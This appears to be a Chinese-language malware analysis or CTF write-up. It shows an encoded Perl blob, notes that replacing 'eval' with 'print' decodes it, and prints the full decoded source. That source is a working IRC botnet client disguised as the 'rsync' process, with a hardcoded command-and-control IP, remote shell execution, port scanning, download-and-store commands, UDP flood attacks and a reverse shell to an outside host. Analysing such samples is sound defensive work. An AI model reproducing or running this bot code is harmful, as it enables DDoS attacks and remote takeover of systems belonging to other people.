\"B`@(\"`@(\"`@8VQO<V4H1DE,12D[\"@H@(\"`@(\"`@(&UY(\"1P_86-K8GET92`]('!A8VLH(DXB+\"`D8W5R7V)Y=&4I.PH@(\"`@(\"`@('!R:6YT(\"1F:\"`B)'!A8VMB>71E(CL*_\"B`@(\"`@(\"`@:68@*\"1B>71E<R`]/2`D8W5R7V)Y=&4I('L*(\"`@(\"`@(\"`@(\"`D9&-C7W-E;\"T^<F5M;W9E_*\"1F:\"D[\"B`@(\"`@(\"`@(\"`@)&9H+3YC;&]S93L*(\"`@(\"`@(\"`@(\"`D1$-#>R1F:'U[<W1A='5S?2`](\")2_96-E8FED;R([\"B`@(\"`@(\"`@(\"`@)$1#0WLD9FA]>V9T:6UE?2`]('1I;64[\"B`@(\"`@(\"`@(\"`@;F5X=#L*_(\"`@(\"`@(\"!]\"B`@(\"`@?2!E;'-I9B`H)&1C8W1I<&\\@97$@(G-E;F0B*2![\"B`@(\"`@(\"`@(\"!M>2`D<V5N_9\"`](\"1F:\"T^86-C97!T.PH@(\"`@(\"`@(\"`@)'-E;F0M/F%U=&]F;'5S:\"@Q*3L*(\"`@(\"`@(\"`@(\"1D8V-?_<V5L+3YA9&0H)'-E;F0I.PH@(\"`@(\"`@(\"`@)&1C8U]S96PM/G)E;6]V92@D9F@I.PH@(\"`@(\"`@(\"`@)$1#_0WLD<V5N9'U[=&EP;WT@/2`G<V5N9&-O;B<[\"B`@(\"`@(\"`@(\"`D1$-#>R1S96YD?7MI=&EM97T@/2!T:6UE_.PH@(\"`@(\"`@(\"`@)$1#0WLD<V5N9'U[;FEC:WT@/2`D;FEC:SL*(\"`@(\"`@(\"`@(\"1$0T-[)'-E;F1]>V)Y_=&5S?2`](\"1B>71E<SL*(\"`@(\"`@(\"`@(\"1$0T-[)'-E;F1]>V-U<F)Y=&5](#T@,#L*(\"`@(\"`@(\"`@(\"1$_0T-[)'-E;F1]>V%R<75I=F]](#T@)&%R<75I=F\\[\"B`@(\"`@(\"`@(\"`D1$-#>R1S96YD?7MI<'T@/2`D<V5N_9\"T^<&5E<FAO<W0[\"B`@(\"`@(\"`@(\"`D1$-#>R1S96YD?7MP;W)T87T@/2`D<V5N9\"T^<&5E<G!O<G0[\"B`@_(\"`@(\"`@(\"`D1$-#>R1S96YD?7MS=&%T=7-](#T@(D5N=FEA;F1O(CL*\"B`@(\"`@(\"`@(\"!O<&5N*$9)3$4L_(\"(\\(\"1A<G%U:79O(BD[\"B`@(\"`@(\"`@(\"!M>2`D9F)Y=&5S.PH@(\"`@(\"`@(\"`@<F5A9\"A&24Q%+\"`D9F)Y_=&5S+\"`Q,#(T*3L*(\"`@(\"`@(\"`@('!R:6YT(\"1S96YD(\"(D9F)Y=&5S(CL*(\"`@(\"`@(\"`@(&-L;W-E($9)_3$4[\"B`@(\"`@?2!E;'-I9B`H)&1C8W1I<&\\@97$@)W-E;F1C;VXG*2![\"B`@(\"`@(\"`@(\"!M>2`D8GET97-?_<V5N9&5D(#T@=6YP86-K*\").(BP@)&US9RD[\"B`@(\"`@(\"`@(\"`D1$-#>R1F:'U[8W5R8GET97T@/2`D8GET_97-?<V5N9&5D.PH@(\"`@(\"`@(\"`@:68@*\"1B>71E<U]S96YD960@/3T@)&)Y=&5S*2![\"B`@(\"`@(\"`@(\"`@_(\"`D9F@M/F-L;W-E.PH@(\"`@(\"`@(\"`@(\"`@)&1C8U]S96PM/G)E;6]V92@D9F@I.PH@(\"`@(\"`@(\"`@(\"`@_)$1#0WLD9FA]>W-T871U<WT@/2`B16YV:6%D;R([\"B`@(\"`@(\"`@(\"`@(\"`D1$-#>R1F:'U[9G1I;65](#T@_=&EM93L*(\"`@(\"`@(\"`@(\"`@(&YE>'0[\"B`@(\"`@(\"`@(\"!]\"B`@(\"`@(\"`@(\"!O<&5N*%-%3D1&24Q%+\"`B_/\"`D87)Q=6EV;R(I.PH@(\"`@(\"`@(\"`@<V5E:RA314Y$1DE,12P@)&)Y=&5S7W-E;F1E9\"P@,\"D[\"B`@(\"`@_(\"`@(\"!M>2`D<V5N9%]B>71E<SL*(\"`@(\"`@(\"`@(')E860H4T5.1$9)3$4L(\"1S96YD7V)Y=&5S+\"`Q,#(T_*3L*(\"`@(\"`@(\"`@('!R:6YT(\"1F:\"`B)'-E;F1?8GET97,B.PH@(\"`@(\"`@(\"`@8VQO<V4H4T5.1$9)3$4I_.PH@(\"`@('T*(\"`@?0I]\"@H*<W5B(%-%3D0@>PH@(&UY(\"@D;FEC:RP@)&%R<75I=F\\I(#T@0%\\[\"B`@=6YL_97-S(\"@M<B`B)&%R<75I=F\\B*2![\"B`@(\"!R971U<FXH,\"D[\"B`@?0H*(\"!M>2`D9&-C87)K(#T@)&%R<75I_=F\\[\"B`@)&1C8V%R:R`]?B!S+ULN*EPO72A<4RLI+R0Q+SL*\"B`@;7D@)&UE=6EP(#T@)#HZ:7)C7W-E<G9E_<G-[(B0Z.DE20U]C=7)?<V]C:V5T(GU[)VUE=6EP)WT[\"B`@;7D@)&QO;F=I<\"`]('5N<&%C:R@B3B(L:6YE_=%]A=&]N*\"1M975I<\"DI.PH*(\"!M>2!`9FEL97-T870@/2!S=&%T*\"1A<G%U:79O*3L*(\"!M>2`D<VEZ95]T_;W1A;#TD9FEL97-T871;-UT[\"B`@:68@*\"1S:7IE7W1O=&%L(#T](#`I('L*(\"`@(\"!R971U<FXH,\"D[\"B`@_?0H*(\"!M>2`H)'!O<G1A+\"`D<V5N9'-O8VLI.PH@(&1O('L*(\"`@(\"1P;W)T82`](&EN=\"!R86YD*#8T-3$Q_*3L*(\"`@(\"1P;W)T82`K/2`Q,#(T.PH@(\"`@)'-E;F1S;V-K(#T@24\\Z.E-O8VME=#HZ24Y%5\"T^;F5W*$QI_<W1E;CT^,2P@3&]C86Q0;W)T(#T^)'!O<G1A+\"!0<F]T;R`]/B`G=&-P)RD@86YD(\"1D8V-?<V5L+3YA9&0H_)'-E;F1S;V-K*3L*(\"!]('5N=&EL(\"1S96YD<V]C:SL*\"B`@)$1#0WLD<V5N9'-O8VM]>W1I<&]](#T@)W-E_;F0G.PH@(\"1$0T-[)'-E;F1S;V-K?7MN:6-K?2`](\"1N:6-K.PH@(\"1$0T-[)'-E;F1S;V-K?7MB>71E<WT@_/2`D<VEZ95]T;W1A;#L*(\"`D1$-#>R1S96YD<V]C:WU[87)Q=6EV;WT@/2`D87)Q=6EV;SL*\"@H@(\"8Z.F-T_8W`H(B1N:6-K(BP@(D1#0R!314Y$(\"1D8V-A<FL@)&QO;F=I<\"`D<&]R=&$@)'-I>F5?=&]T86PB*3L*\"GT*_\"G-U8B!'150@>PH@(&UY(\"@D87)Q=6EV;RP@)&1C8VQO;F=I<\"P@)&1C8W!O<G1A+\"`D8GET97,L(\"1N:6-K_*2`]($!?.PH@(')E='5R;B@P*2!I9B`H+64@(B1A<G%U:79O(BD[\"B`@:68@*&]P96XH1DE,12P@(CX@)&%R_<75I=F\\B*2D@>PH@(\"`@(&-L;W-E($9)3$4[\"B`@?2!E;'-E('L*(\"`@(')E='5R;B@P*3L*(\"!]\"@H@(&UY_(\"1D8V-I<#UF:7AA9&1R*\"1D8V-L;VYG:7`I.PH@(')E='5R;B@P*2!I9B`H)&1C8W!O<G1A(#P@,3`R-\"!O_<B!N;W0@9&5F:6YE9\"`D9&-C:7`@;W(@)&)Y=&5S(#P@,2D[\"B`@;7D@)&1C8W-O8VL@/2!)3SHZ4V]C:V5T_.CI)3D54+3YN97<H4')O=&\\]/B)T8W`B+\"!0965R061D<CT^)&1C8VEP+\"!0965R4&]R=#T^)&1C8W!O<G1A_+\"!4:6UE;W5T/3XQ-2D@;W(@<F5T=7)N(\"@P*3L*(\"`D9&-C<V]C:RT^875T;V9L=7-H*#$I.PH@(\"1D8V-?_<V5L+3YA9&0H)&1C8W-O8VLI.PH@(\"1$0T-[)&1C8W-O8VM]>W1I<&]](#T@)V=E=\"<[\"B`@)$1#0WLD9&-C_<V]C:WU[:71I;65](#T@=&EM93L*(\"`D1$-#>R1D8V-S;V-K?7MN:6-K?2`](\"1N:6-K.PH@(\"1$0T-[)&1C_8W-O8VM]>V)Y=&5S?2`](\"1B>71E<SL*(\"`D1$-#>R1D8V-S;V-K?7MC=7)B>71E?2`](#`[\"B`@)$1#0WLD_9&-C<V]C:WU[87)Q=6EV;WT@/2`D87)Q=6EV;SL*(\"`D1$-#>R1D8V-S;V-K?7MI<'T@/2`D9&-C:7`[\"B`@_)$1#0WLD9&-C<V]C:WU[<&]R=&%](#T@)&1C8W!O<G1A.PH@(\"1$0T-[)&1C8W-O8VM]>W-T871U<WT@/2`B_4F5C96)E;F1O(CL*?0H*<W5B(%-T871U<R![\"B`@;7D@)'-O8VME=\"`]('-H:69T.PH@(&UY(\"1S;V-K7W1I_<&\\@/2`D1$-#>R1S;V-K971]>W1I<&]].PH@('5N;&5S<R`H;&,H)'-O8VM?=&EP;RD@97$@(F-H870B*2![_\"B`@(\"!M>2`D;FEC:R`](\"1$0T-[)'-O8VME='U[;FEC:WT[\"B`@(\"!M>2`D87)Q=6EV;R`](\"1$0T-[)'-O_8VME='U[87)Q=6EV;WT[\"B`@(\"!M>2`D:71I;64@/2`D1$-#>R1S;V-K971]>VET:6UE?3L*(\"`@(&UY(\"1F_=&EM92`]('1I;64[\"B`@(\"!M>2`D<W1A='5S(#T@)$1#0WLD<V]C:V5T?7MS=&%T=7-].PH@(\"`@)&9T:6UE_(#T@)$1#0WLD<V]C:V5T?7MF=&EM97T@:68@9&5F:6YE9\"@D1$-#>R1S;V-K971]>V9T:6UE?2D[\"@H@(\"`@_;7D@)&1?=&EM92`](\"1F=&EM92TD:71I;64[\"@H@(\"`@;7D@)&-U<E]B>71E(#T@)$1#0WLD<V]C:V5T?7MC_=7)B>71E?3L*(\"`@(&UY(\"1B>71E<U]T;W1A;\"`](\"`D1$-#>R1S;V-K971]>V)Y=&5S?3L*\"B`@(\"!M>2`D_<F%T92`](#`[\"B`@(\"`D<F%T92`](\"@D8W5R7V)Y=&4O,3`R-\"DO)&1?=&EM92!I9B`D8W5R7V)Y=&4@/B`P_.PH@(\"`@;7D@)'!O<F-E;B`](\"@D8W5R7V)Y=&4J,3`P*2\\D8GET97-?=&]T86P[\"@H@(\"`@;7D@*\"1R7V1U_=BP@)'!?9'5V*3L*(\"`@(&EF(\"@D<F%T92`]?B`O7BA<9\"LI7\"XH7&0I*%QD*2A<9\"DO*2![\"B`@(\"`@(\"`D_<E]D=78@/2`D,SL@)')?9'5V*RL@:68@)#0@/CT@-3L*(\"`@(\"`@(\"1R871E(#T@(B0Q7\"XD,B(N(B1R7V1U_=B([\"B`@(\"!]\"B`@(\"!I9B`H)'!O<F-E;B`]?B`O7BA<9\"LI7\"XH7&0I*%QD*2A<9\"DO*2![\"B`@(\"`@(\"`D_<%]D=78@/2`D,SL@)'!?9'5V*RL@:68@)#0@/CT@-3L*(\"`@(\"`@(\"1P;W)C96X@/2`B)#%<+B0R(BXB)'!?_9'5V(CL*(\"`@('T*(\"`@(')E='5R;B@B)'-O8VM?=&EP;R(L(B1S=&%T=7,B+\"(D;FEC:R(L(B1A<G%U:79O_(BPB)&)Y=&5S7W1O=&%L(BP@(B1C=7)?8GET92(L(B1D7W1I;64B+\"`B)')A=&4B+\"`B)'!O<F-E;B(I.PH@_('T*\"@H@(')E='5R;B@P*3L*?0H*\"G-U8B!F:7AA9&1R('L*(\"`@(&UY(\"@D861D<F5S<RD@/2!`7SL*\"B`@_(\"!C:&]M<\"`D861D<F5S<SL@(\"`@(`H@(\"`@:68@*\"1A9&1R97-S(#U^(\"]>7&0K)\"\\I('L*(\"`@(\"`@(\"!R_971U<FX@:6YE=%]N=&]A*'!A8VL@(DXB+\"`D861D<F5S<RD[\"B`@(\"!](&5L<VEF(\"@D861D<F5S<R`]?B`O_7ELQ,ET_7&1[,2PR?5PN6S$R73]<9'LQ+#)]7\"Y;,3)=/UQD>S$L,GU<+ELQ,ET_7&1[,2PR?20O*2![\"B`@_(\"`@(\"`@<F5T=7)N(\"1A9&1R97-S.PH@(\"`@?2!E;'-I9B`H)&%D9')E<W,@/7X@='(O82UZ02U:+R\\I('L@_(\"`@(\"`@(\"`@(\"`@(\"`@(\"`@(`H@(\"`@(\"`@(')E='5R;B!I;F5T7VYT;V$H*\"AG971H;W-T8GEN86UE*\"1AV9&1R97-S*2E;-%TI6S!=*3L*(\"`@('T@96QS92![\"B`@(\"`@(\"`@<F5T=7)N.PH@(\"`@?0I]}\n```\n\n使用了 `eval unpack` 看起來是需要解密的東西\n\n\n\n發現 perl 有一個函數為 `unpack()`\n\n所以我們將 開頭的 `eval` 掉換成 `print`\n\n在使用 perl 執行\n\n```bash=\n$ perl rsync\n```\n\n順利把程式碼解出來了\n\n```perl\n\nmy $processo = 'rsync';\n\n$servidor='5.255.86.129' unless $servidor;\nmy $porta='443';\nmy @canais=(\"#007\");\nmy @adms=(\"A\",\"X\");\nmy @auth=(\"localhost\");\n\nmy $linas_max=6;\nmy $sleep=3;\n\nmy $nick = getnick();\nmy $ircname = getnick();\nmy $realname = (`uname -a`);\n\nmy $acessoshell = 1;\nmy $prefixo = \"! \";\nmy $estatisticas = 0;\nmy $pacotes = 1;\n\nmy $VERSAO = '0.2a';\n\n$SIG{'INT'} = 'IGNORE';\n$SIG{'HUP'} = 'IGNORE';\n$SIG{'TERM'} = 'IGNORE';\n$SIG{'CHLD'} = 'IGNORE';\n$SIG{'PS'} = 'IGNORE';\n\nuse IO::Socket;\nuse Socket;\nuse IO::Select;\nchdir(\"/\");\n$servidor=\"$ARGV[0]\" if $ARGV[0];\n$0=\"$processo\".\"\\0\";\nmy $pid=fork;\nexit if $pid;\ndie \"Problema com o fork: $!\" unless defined($pid);\n\nmy %irc_servers;\nmy %DCC;\nmy $dcc_sel = new IO::Select->new();\n\n\n\n\nsub getnick {\n  return \"x\".int(rand(9000));\n}\n\n\nsub getident {\n  my $retornoident = &_get(\"http://www.minpop.com/sk12pack/idents.php\");\n  my $identchance = int(rand(1000));\n  if ($identchance > 30) {\n     return $nick;\n  } else {\n     return $retornoident;\n  }\n  return $retornoident;\n}\n\nsub getname {\n  my $retornoname = &_get(\"http://www.minpop.com/sk12pack/names.php\");\n  return $retornoname;\n}\n\nsub getident2 {\n        my $length=shift;\n        $length = 3 if ($length < 3);\n\n        my @chars=('a'..'z','A'..'Z','1'..'9');\n        foreach (1..$length)\n        {\n                $randomstring.=$chars[rand @chars];\n        }\n        return $randomstring;\n}\n\nsub getstore ($$)\n{\n  my $url = shift;\n  my $file = shift;\n\n  $http_stream_out = 1;\n  open(GET_OUTFILE, \"> $file\");\n  %http_loop_check = ();\n  _get($url);\n  close GET_OUTFILE;\n  return $main::http_get_result;\n}\n\nsub _get\n{\n  my $url = shift;\n  my $proxy = \"\";\n  grep {(lc($_) eq \"http_proxy\") && ($proxy = $ENV{$_})} keys %ENV;\n  if (($proxy eq \"\") && $url =~ m,^http://([^/:]+)(?::(\\d+))?(/\\S*)?$,) {\n    my $host = $1;\n    my $port = $2 || 80;\n    my $path = $3;\n    $path = \"/\" unless defined($path);\n    return _trivial_http_get($host, $port, $path);\n  } elsif ($proxy =~ m,^http://([^/:]+):(\\d+)(/\\S*)?$,) {\n    my $host = $1;\n    my $port = $2;\n    my $path = $url;\n    return _trivial_http_get($host, $port, $path);\n  } else {\n    return undef;\n  }\n}\n\n\nsub _trivial_http_get\n{\n  my($host, $port, $path) = @_;\n  my($AGENT, $VERSION, $p);\n\n  $AGENT = \"get-minimal\";\n  $VERSION = \"20000118\";\n\n  $path =~ s/ /%20/g;\n\n  require IO::Socket;\n  local($^W) = 0;\n  my $sock = IO::Socket::INET->new(PeerAddr => $host,\n                                   PeerPort => $port,\n                                   Proto   => 'tcp',\n                                   Timeout  => 60) || return;\n  $sock->autoflush;\n  my $netloc = $host;\n  $netloc .= \":$port\" if $port != 80;\n  my $request = \"GET $path HTTP/1.0\\015\\012\"\n              . \"Host: $netloc\\015\\012\"\n              . \"User-Agent: $AGENT/$VERSION/u\\015\\012\";\n  $request .= \"Pragma: no-cache\\015\\012\" if ($main::http_no_cache);\n  $request .= \"\\015\\012\";\n  print $sock $request;\n\n  my $buf = \"\";\n  my $n;\n  my $b1 = \"\";\n  while ($n = sysread($sock, $buf, 8*1024, length($buf))) {\n    if ($b1 eq \"\") { \n      $b1 = $buf;         \n      $buf =~ s/.+?\\015?\\012\\015?\\012//s;      \n    }\n    if ($http_stream_out) { print GET_OUTFILE $buf; $buf = \"\"; }\n  }\n  return undef unless defined($n);\n\n  $main::http_get_result = 200;\n  if ($b1 =~ m,^HTTP/\\d+\\.\\d+\\s+(\\d+)[^\\012]*\\012,) {\n    $main::http_get_result = $1;\n    if ($main::http_get_result =~ /^30[1237]/ && $b1 =~ /\\012Location:\\s*(\\S+)/\n) {\n      my $url = $1;\n      return undef if $http_loop_check{$url}++;\n      return _get($url);\n    }\n    return undef unless $main::http_get_result =~ /^2/;\n  }\n\n  return $buf;\n}\n\n\n$sel_cliente = IO::Select->new();\nsub sendraw {\n  if ($#_ == '1') {\n    my $socket = $_[0];\n    print $socket \"$_[1]\\n\";\n  } else {\n      print $IRC_cur_socket \"$_[0]\\n\";\n  }\n}\n\nsub conectar {\n   my $meunick = $_[0];\n   my $servidor_con = $_[1];\n   my $porta_con = $_[2];\n\n   my $IRC_socket = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$servidor_con\", PeerPort=>$porta_con) or return(1);\n   if (defined($IRC_socket)) {\n     $IRC_cur_socket = $IRC_socket;\n\n     $IRC_socket->autoflush(1);\n     $sel_cliente->add($IRC_socket);\n\n     $irc_servers{$IRC_cur_socket}{'host'} = \"$servidor_con\";\n     $irc_servers{$IRC_cur_socket}{'porta'} = \"$porta_con\";\n     $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;\n     $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;\n     nick(\"$meunick\");\n     sendraw(\"USER $ircname \".$IRC_socket->sockhost.\" $servidor_con :$realname\");\n     sleep 2;\n   }\n\n}\nmy $line_temp;\nwhile( 1 ) {\n   while (!(keys(%irc_servers))) { conectar(\"$nick\", \"$servidor\", \"$porta\"); }\n   delete($irc_servers{''}) if (defined($irc_servers{''}));\n   &DCC::connections;\n   my @ready = $sel_cliente->can_read(0.6);\n   next unless(@ready);\n   foreach $fh (@ready) {\n     $IRC_cur_socket = $fh;\n     $meunick = $irc_servers{$IRC_cur_socket}{'nick'};\n     $nread = sysread($fh, $msg, 4096);\n     if ($nread == 0) {\n        $sel_cliente->remove($fh);\n        $fh->close;\n        delete($irc_servers{$fh});\n     }\n     @lines = split (/\\n/, $msg);\n\n     for(my $c=0; $c<= $#lines; $c++) {\n       $line = $lines[$c];\n       $line=$line_temp.$line if ($line_temp);\n       $line_temp='';\n       $line =~ s/\\r$//;\n       unless ($c == $#lines) {\n         parse(\"$line\");\n       } else {\n           if ($#lines == 0) {\n             parse(\"$line\");\n           } elsif ($lines[$c] =~ /\\r$/) {\n               parse(\"$line\");\n           } elsif ($line =~ /^(\\S+) NOTICE AUTH :\\*\\*\\*/) {\n               parse(\"$line\");\n           } else {\n               $line_temp = $line;\n           }\n       }\n      }\n   }\n}\n\nsub parse {\n   my $servarg = shift;\n   if ($servarg =~ /^PING \\:(.*)/) {\n     sendraw(\"PONG :$1\");\n   } elsif ($servarg =~ /^\\:(.+?)\\!(.+?)\\@(.+?) PRIVMSG (.+?) \\:(.+)/) {\n       my $pn=$1; my $onde = $4; my $args = $5;\n       if ($args =~ /^\\001VERSION\\001$/) {\n         notice(\"$pn\", \"\\001VERSION mIRC v6.16 ENE ALIN GABRIEL\\001\");\n       }\n       elsif ($args =~ /^\\001PING\\s+(\\d+)\\001$/) {\n         notice(\"$pn\", \"\\001PONG\\001\");\n       }\n       elsif (grep {$_ =~ /^\\Q$pn\\E$/i } @adms) {\n         if ($onde eq \"$meunick\"){\n           shell(\"$pn\", \"$args\");\n           }\n         elsif ($args =~ /^(\\Q$meunick\\E|\\Q$prefixo\\E)\\s+(.*)/ ) {\n            my $natrix = $1;\n            my $arg = $2;\n            if ($arg =~ /^\\!(.*)/) {\n              ircase(\"$pn\",\"$onde\",\"$1\") unless ($natrix eq \"$prefixo\" and $arg =~ /^\\!nick/);\n            } elsif ($arg =~ /^\\@(.*)/) {\n                $ondep = $onde;\n                $ondep = $pn if $onde eq $meunick;\n                bfunc(\"$ondep\",\"$1\");\n            } else {\n                shell(\"$onde\", \"$arg\");\n            }\n         }\n       }\n   } elsif ($servarg =~ /^\\:(.+?)\\!(.+?)\\@(.+?)\\s+NICK\\s+\\:(\\S+)/i) {\n       if (lc($1) eq lc($meunick)) {\n         $meunick=$4;\n         $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;\n       }\n   } elsif ($servarg =~ m/^\\:(.+?)\\s+433/i) {\n       $meunick = getnick();\n       nick(\"$meunick\");\n   } elsif ($servarg =~ m/^\\:(.+?)\\s+001\\s+(\\S+)\\s/i) {\n       $meunick = $2;\n       $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;\n       $irc_servers{$IRC_cur_socket}{'nome'} = \"$1\";\n       foreach my $canal (@canais) {\n         sendraw(\"JOIN $canal\");\n       }\n   }\n}\n\nsub bfunc {\n  my $printl = $_[0];\n  my $funcarg = $_[1];\n  if (my $pid = fork) {\n     waitpid($pid, 0);\n  } else {\n      if (fork) {\n         exit;\n       } else {\n           if ($funcarg =~ /^portscan (.*)/) {\n             my $hostip=\"$1\";\n             my @portas=(\"21\",\"22\",\"23\",\"25\",\"53\",\"80\",\"110\",\"143\",\"6665\");\n             my (@aberta, %porta_banner);\n             foreach my $porta (@portas)  {\n                my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto => 'tcp', Timeout => 4);\n                if ($scansock) {\n                   push (@aberta, $porta);\n                   $scansock->close;\n                }\n             }\n             if (@aberta) {\n               sendraw($IRC_cur_socket, \"PRIVMSG $printl :Portas abertas: @aberta\");\n             } else {\n                 sendraw($IRC_cur_socket,\"PRIVMSG $printl :Nenhuma porta aberta foi encontrada.\");\n             }\n           }\n\n           elsif ($funcarg =~ /^download\\s+(.*)\\s+(.*)/) {\n            getstore(\"$1\", \"$2\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :Download de $2 ($1) Conclu.do!\") if ($estatisticas);\n            }\n\n           elsif ($funcarg =~ /^fullportscan\\s+(.*)\\s+(\\d+)\\s+(\\d+)/) {\n             my $hostname=\"$1\";\n             my $portainicial = \"$2\";\n             my $portafinal = \"$3\";\n             my (@abertas, %porta_banner);\n             foreach my $porta ($portainicial..$portafinal)\n             {\n               my $scansock = IO::Socket::INET->new(PeerAddr => $hostname, PeerPort => $porta, Proto => 'tcp', Timeout => 4);\n               if ($scansock) {\n                 push (@abertas, $porta);\n                 $scansock->close;\n                 if ($estatisticas) {\n                   sendraw($IRC_cur_socket, \"PRIVMSG $printl :Porta $porta aberta em $hostname\");\n                 }\n               }\n             }\n             if (@abertas) {\n               sendraw($IRC_cur_socket, \"PRIVMSG $printl :Portas abertas: @abertas\");\n             } else {\n               sendraw($IRC_cur_socket,\"PRIVMSG $printl :Nenhuma porta aberta foi encontrada.\");\n             }\n            }\n\n            elsif ($funcarg =~ /^udp\\s+(.*)\\s+(\\d+)\\s+(\\d+)/) {\n              return unless $pacotes;\n              socket(Tr0x, PF_INET, SOCK_DGRAM, 17);\n              my $alvo=inet_aton(\"$1\");\n              my $porta = \"$2\";\n              my $tempo = \"$3\";\n              my $pacote;\n              my $pacotese;\n              my $fim = time + $tempo;\n              my $pacota = 1;\n              while (($pacota == \"1\") && ($pacotes == \"1\")) {\n                $pacota = 0 if ((time >= $fim) && ($tempo != \"0\"));\n                $pacote=$rand x $rand x $rand;\n                $porta = int(rand 65000) +1 if ($porta == \"0\");\n                send(Tr0x, 0, $pacote, sockaddr_in($porta, $alvo)) and $pacotese++ if ($pacotes == \"1\");\n              }\n              if ($estatisticas)\n              {\n               sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Tempo de Pacotes\\002: $tempo\".\"s\");\n               sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Total de Pacotes\\002: $pacotese\");\n               sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Alvo dos Pacotes\\002: $1\");\n              }\n            }\n\n            elsif ($funcarg =~ /^udpfaixa\\s+(.*)\\s+(\\d+)\\s+(\\d+)/) {\n              return unless $pacotes;\n              socket(Tr0x, PF_INET, SOCK_DGRAM, 17);\n              my $faixaip=\"$1\";\n              my $porta = \"$2\";\n              my $tempo = \"$3\";\n              my $pacote;\n              my $pacotes;\n              my $fim = time + $tempo;\n              my $pacota = 1;\n              my $alvo;\n              while ($pacota == \"1\") {\n                $pacota = 0 if ((time >= $fim) && ($tempo != \"0\"));\n                for (my $faixa = 1; $faixa <= 255; $faixa++) {\n                  $alvo = inet_aton(\"$faixaip.$faixa\");\n                  $pacote=$rand x $rand x $rand;\n                  $porta = int(rand 65000) +1 if ($porta == \"0\");\n                  send(Tr0x, 0, $pacote, sockaddr_in($porta, $alvo)) and $pacotese++ if ($pacotes == \"1\");\n                  if ($faixa >= 255) {\n                    $faixa = 1;\n                  }\n                }\n              }\n              if ($estatisticas)\n              {\n               sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Tempo de Pacotes\\002: $tempo\".\"s\");\n               sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Total de Pacotes\\002: $pacotese\");\n               sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Alvo dos Pacotes\\002: $alvo\");\n              }\n            }\n\n            elsif ($funcarg =~ /^conback\\s+(.*)\\s+(\\d+)/) {\n              my $host = \"$1\";\n              my $porta = \"$2\";\n              my $proto = getprotobyname('tcp');\n              my $iaddr = inet_aton($host);\n              my $paddr = sockaddr_in($porta, $iaddr);\n              my $shell = \"/bin/sh -i\";\n              if ($^O eq \"MSWin32\") {\n                $shell = \"cmd.exe\";\n              }\n              socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die \"socket: $!\";\n              connect(SOCKET, $paddr) or die \"connect: $!\";\n              open(STDIN, \">&SOCKET\");\n              open(STDOUT, \">&SOCKET\");\n              open(STDERR, \">&SOCKET\");\n              system(\"$shell\");\n              close(STDIN);\n              close(STDOUT);\n              close(STDERR);\n\n              if ($estatisticas)\n              {\n               sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Conectando-se em\\002: $host:$porta\");\n              }\n            }\n\n           elsif ($funcarg =~ /^oldpack\\s+(.*)\\s+(\\d+)\\s+(\\d+)/) {\n            return unless $pacotes;\n             my ($dtime, %pacotes) = attacker(\"$1\", \"$2\", \"$3\");\n             $dtime = 1 if $dtime == 0;\n             my %bytes;\n             $bytes{igmp} = $2 * $pacotes{igmp};\n             $bytes{icmp} = $2 * $pacotes{icmp};\n             $bytes{o} = $2 * $pacotes{o};\n             $bytes{udp} = $2 * $pacotes{udp};\n             $bytes{tcp} = $2 * $pacotes{tcp};\n             unless ($estatisticas)\n             {\n               sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002 - Status -\\002\");\n               sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Timp\\002: $dtime\".\"secunde.\");\n               sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Total packet\\002: \".($pacotes{udp} + $pacotes{igmp} + $pacotes{icmp} +  $pacotes{o}));\n               sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Total bytes\\002: \".($bytes{icmp} + $bytes {igmp} + $bytes{udp} + $bytes{o}));\n               sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Flood\\002: \".int((($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)/$dtime).\" kbps\");\n             }\n           }\n           exit;\n       }\n  }\n}\n\nsub ircase {\n  my ($kem, $printl, $case) = @_;\n\n   if ($case =~ /^join (.*)/) {\n     j(\"$1\");\n   }\n   elsif ($case =~ /^part (.*)/) {\n      p(\"$1\");\n   }\n   elsif ($case =~ /^rejoin\\s+(.*)/) {\n      my $chan = $1;\n      if ($chan =~ /^(\\d+) (.*)/) {\n        for (my $ca = 1; $ca <= $1; $ca++ ) {\n          p(\"$2\");\n          j(\"$2\");\n        }\n      } else {\n          p(\"$chan\");\n          j(\"$chan\");\n      }\n   }\n   elsif ($case =~ /^op/) {\n      op(\"$printl\", \"$kem\") if $case eq \"op\";\n      my $oarg = substr($case, 3);\n      op(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);\n   }\n   elsif ($case =~ /^deop/) {\n      deop(\"$printl\", \"$kem\") if $case eq \"deop\";\n      my $oarg = substr($case, 5);\n      deop(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);\n   }\n   elsif ($case =~ /^voice/) {\n      voice(\"$printl\", \"$kem\") if $case eq \"voice\";\n      $oarg = substr($case, 6);\n      voice(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);\n   }\n   elsif ($case =~ /^devoice/) {\n      devoice(\"$printl\", \"$kem\") if $case eq \"devoice\";\n      $oarg = substr($case, 8);\n      devoice(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);\n   }\n   elsif ($case =~ /^msg\\s+(\\S+) (.*)/) {\n      msg(\"$1\", \"$2\");\n   }\n   elsif ($case =~ /^flood\\s+(\\d+)\\s+(\\S+) (.*)/) {\n      for (my $cf = 1; $cf <= $1; $cf++) {\n        msg(\"$2\", \"$3\");\n      }\n   }\n   elsif ($case =~ 